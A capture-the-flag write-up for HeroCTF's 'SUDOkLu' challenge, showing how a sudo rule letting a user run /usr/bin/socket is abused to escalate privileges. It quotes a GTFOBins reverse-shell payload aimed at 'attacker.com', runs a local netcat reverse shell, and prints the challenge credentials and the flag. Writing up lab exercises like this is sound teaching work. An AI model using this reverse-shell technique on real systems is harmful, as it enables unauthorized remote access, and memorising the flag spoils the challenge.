# SUDOkLu

### Category

System

### Description

This is a warmup to get you going. Your task is to read `/home/privilegeduser/flag.txt`. For our new commers, the title might steer you in the right direction ;). Good luck!

Credentials: `user:password123`

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

In this challenge you have to exploit a very common misconfiguration on linux systems.

```plain
$ sudo -l
Matching Defaults entries for user on 5e21499cd6f4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User user may run the following commands on 5e21499cd6f4:
    (privilegeduser) NOPASSWD: /usr/bin/socket
```

The `-l` option allows you to check yout user's privileges. Here you can see that he can run /usr/bin/socket as root.

https://gtfobins.github.io/ is a great ressource everytime you encouter this case scenario.

Just go to the page about the socket command, and you will find the following payload:

```plain
RHOST=attacker.com
RPORT=12345
socket -qvp '/bin/sh -i' $RHOST $RPORT
```

In our case, let's build a local reverse shell:

Terminal 1:

```plain
$ nc -nlvp 8888
```

Terminal 2:

```plain
$ sudo -u privilegeduser /usr/bin/socket -qvp '/bin/sh -i' localhost 8888
```

You should get a shell as privilegeduser in Terminal 1!

```plain
Connection received on 127.0.0.1 38344
$ id
uid=1001(privilegeduser) gid=1001(privilegeduser) groups=1001(privilegeduser)
$ cat /home/privilegeduser/flag.txt
Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```

### Flag

```plain
Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```
